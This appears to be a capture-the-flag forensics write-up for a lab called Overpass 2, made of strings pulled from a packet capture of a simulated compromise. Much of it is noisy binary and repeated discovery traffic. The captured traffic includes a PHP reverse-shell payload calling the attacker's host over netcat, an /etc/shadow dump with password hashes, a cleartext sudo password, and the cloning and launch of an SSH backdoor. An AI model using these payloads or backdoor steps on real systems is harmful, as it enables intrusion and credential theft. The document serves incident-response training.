OverPass Box(Defend) -----> THM

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

'''
md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc (Authentic)

'''
Forensic of overpass2.pcapng

'''

strings overpass2.pcapng -n 8 

This command revealed some useful information

Pieces of Informations as evidence

```
james@overpass-production

cd ssh-backdoor
1cd ssh-backdoor
james@overpass-production:~/ssh-backdoor$ 

ssh-keygen
wssh-keygen
xGenerating public/private rsa key pair.
zEnter file in which to save the key (/home/james/.ssh/id_rsa): 
w5Rp[id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+
james@overpass-production:~/ssh-backdoor$ 
)chmod +x backdoor
uchmod +x backdoor
ujames@overpass-production:~/ssh-backdoor$ 
DESKTOP-H4BPU1Q
DESKTOP-H4BPU1Q
DESKTOP-H4BPU1Q
DESKTOP-H4BPU1Q
DESKTOP-H4BPU1Q
DESKTOP-H4BPU1Q
DESKTOP-H4BPU1Q
DESKTOP-H4BPU1Q
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SkSSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222

User-Agent: Wget/1.19.4 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.170.145:8080
Connection: Keep-Alive
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.3
Date: Tue, 21 Jul 2020 20:37:40 GMT
Content-type: image/png
Content-Length: 60102
Last-Modified: Tue, 21 Jul 2020 19:33:27 GMT
yiCCPICC Profile
oo\:}i<:DQ
c01>S^d[
>Ei8j67 
@;h{8w/eV
jLgd|1:0aa
,eYPMtd@
@U=UEI	q
l+uNZH|O
sO|^>7<}
TMtI&|>R
y)'^l|]x
%FZ42f&p
8W|>T%OObj?
=uuV>62*
mzke'YAsjj
9m ^Ph~:w
ksXZIXCA
[cWF$Tv>B%
WU)a;uvNN?4
#N#H"ex7
o3.l-[="	xp
T8?GJ/R8$

fGET /index.html HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.170.145:8080
Connection: Keep-Alive
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.3
Date: Tue, 21 Jul 2020 20:37:46 GMT
Content-type: text/html
Content-Length: 815
Last-Modified: Tue, 21 Jul 2020 19:33:39 GMT
    <title>LOL Hacked</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background: black;
            color: limegreen;
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center;
        }
        img {
            position: fixed;
            left: 50%;
            bottom: 0px;
            transform: translate(-50%, -0%);
            margin: 0 auto;
            max-width: 100vw;
            max-height: 100vh;
            margin: auto;
        }
    </style>
    <div>
        <h1>H4ck3d by CooctusClan</h1>
    </div>
    <div>
        <p>Secure your servers!</p>
    </div>
    <div><img src="cooctus.png"></div>


GET / HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "97f-5aae9add6c459-gzip"
JHTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:38:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 20:38:22 GMT
ETag: "32f-5aaf99ab26dad-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 385
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
GET /cooctus.png HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/
Connection: keep-alive
SHTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:38:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 20:38:31 GMT
ETag: "eac6-5aaf99b361586"
Accept-Ranges: bytes
Content-Length: 60102
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: image/png
yiCCPICC Profile
oo\:}i<:DQ
c01>S^d[
>Ei8j67 
@;h{8w/eV
jLgd|1:0aa
,eYPMtd@
@U=UEI	q
l+uNZH|O
sO|^>7<}
TMtI&|>R
y)'^l|]x
%FZ42f&p
8W|>T%OObj?
=uuV>62*
mzke'YAsjj
9m ^Ph~:w
ksXZIXCA
[cWF$Tv>B%
WU)a;uvNN?4
#N#H"ex7
o3.l-[="	xp
Counters provided by dumpcap

```

'''


strings overpass2.pcapng -n 16

This above commands reveals more information below

'''

AMD Ryzen 5 3600 6-Core Processor               (with SSE4.2)
Linux 5.4.0-40-generic
Dumpcap (Wireshark) 3.2.3 (Git v3.2.3 packaged as 3.2.3-1)
Linux 5.4.0-40-generic
GET /development/ HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "588-5aae9add656f8-gzip"
?HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:33:53 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 01:38:24 GMT
ETag: "588-5aae9add656f8-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 675
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
POST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159//
Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
Content-Length: 454
Connection: keep-alive
Upgrade-Insecure-Requests: 1
-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"
-----------------------------1809049028579987031515260006--
+HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:34:01 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 39
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
The file payload.php has been uploaded.
GET /development/uploads/ HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Date: Tue, 21 Jul 2020 20:34:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 472
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html;charset=UTF-8
5P}wGET /development/uploads/payload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/uploads/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
/bin/sh: 0: can't access tty; job control turned off
uid=33(www-data) gid=33(www-data) groups=33(www-data)
james-xubuntu-2004
vpython3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@overpass-production:/var/www/html/development/uploads$ 
-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
www-data@overpass-production:/var/www/html/development/uploads$ 
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.
www-data@overpass-production:/var/www/html/development/uploads$ 
whenevernoteartinstant
 james@overpass-production:/var/www/html/development/uploads$ 
james@overpass-production:~$ 
sudo: invalid option -- ']'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ...
james@overpass-production:~$ 
[sudo] password for james: 
whenevernoteartinstant
gMatching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
james@overpass-production:~$ 
sudo cat /etc/shadow
sudo cat /etc/shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
james@overpass-production:~$ 
git clone https://github.com/NinjaJc01/ssh-backdoor
<git clone https://github.com/NinjaJc01/ssh-backdoor
!Cloning into 'ssh-backdoor'...
ns-1707	awsdns-21
awsdns-hostmaster
www.digicert.com1/0-
&DigiCert SHA2 High Assurance Server CA0
220510120000Z0f1
.http://crl3.digicert.com/sha2-ha-server-g6.crl04
.http://crl4.digicert.com/sha2-ha-server-g6.crl0L
https://www.digicert.com/CPS0
http://ocsp.digicert.com0M
Ahttp://cacerts.digicert.com/DigiCertSHA2HighAssuranceServerCA.crt0
www.digicert.com1+0)
"DigiCert High Assurance EV Root CA0
281022120000Z0p1
www.digicert.com1/0-
&DigiCert SHA2 High Assurance Server CA0
http://ocsp.digicert.com0K
:http://crl4.digicert.com/DigiCertHighAssuranceEVRootCA.crl0=
https://www.digicert.com/CPS0
"remote: Enumerating objects: 18, done.        
remote: Counting objects:   5% (1/18)        
remote: Counting objects:  11% (2/18)        
remote: Counting objects:  16% (3/18)        
remote: Counting objects:  22% (4/18)        
remote: Counting objects:  27% (5/18)        
remote: Counting objects:  33% (6/18)        
remote: Counting objects:  38% (7/18)        
remote: Counting objects:  44% (8/18)        
remote: Counting objects:  50% (9/18)        
remote: Counting objects:  55% (10/18)        
remote: Counting objects:  61% (11/18)        
remote: Counting objects:  66% (12/18)        
remote: Counting objects:  72% (13/18)        
remote: Counting objects:  77% (14/18)        
remote: Counting objects:  83% (15/18)        
remote: Counting objects:  88% (16/18)        
remote: Counting objects:  94% (17/18)        
remote: Counting objects: 100% (18/18)        
remote: Counting objects: 100% (18/18), done.        
remote: Compressing objects:   6% (1/15)        
remote: Compressing objects:  13% (2/15)        
remote: Compressing objects:  20% (3/15)        
remote: Compressing objects:  26% (4/15)        
remote: Compressing objects:  33% (5/15)        
remote: Compressing objects:  40% (6/15)        
remote: Compressing objects:  46% (7/15)        
remote: Compressing objects:  53% (8/15)        
remote: Compressing objects:  60% (9/15)        
remote: Compressing objects:  66% (10/15)        
remote: Compressing objects:  73% (11/15)        
remote: Compressing objects:  80% (12/15)        
remote: Compressing objects:  86% (13/15)        
remote: Compressing objects:  93% (14/15)        
remote: Compressing objects: 100% (15/15)        
remote: Compressing objects: 100% (15/15), done.        
	Unpacking objects:   5% (1/18)   
EUnpacking objects:  11% (2/18)   
FUnpacking objects:  16% (3/18)   
FUnpacking objects:  22% (4/18)   
FUnpacking objects:  27% (5/18)   
FUnpacking objects:  33% (6/18)   
FUnpacking objects:  38% (7/18)   
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
2<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
2<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
V\F+]y0|;$	yghkk-
2<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
2<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
Fremote: Total 18 (delta 4), reused 7 (delta 1), pack-reused 0        
Unpacking objects:  44% (8/18)   
Unpacking objects:  50% (9/18)   
Unpacking objects:  55% (10/18)   
Unpacking objects:  61% (11/18)   
Unpacking objects:  66% (12/18)   
Unpacking objects:  72% (13/18)   
Unpacking objects:  77% (14/18)   
Unpacking objects:  83% (15/18)   
Unpacking objects:  88% (16/18)   
Unpacking objects:  94% (17/18)   
Unpacking objects: 100% (18/18)   
Unpacking objects: 100% (18/18), done.
james@overpass-production:~$ 
2<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
2<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
2<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:c2aa2a21-3460-4479-9f01-60f80a734218</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
1cd ssh-backdoor
james@overpass-production:~/ssh-backdoor$ 
%<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
_<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
%<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
_<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
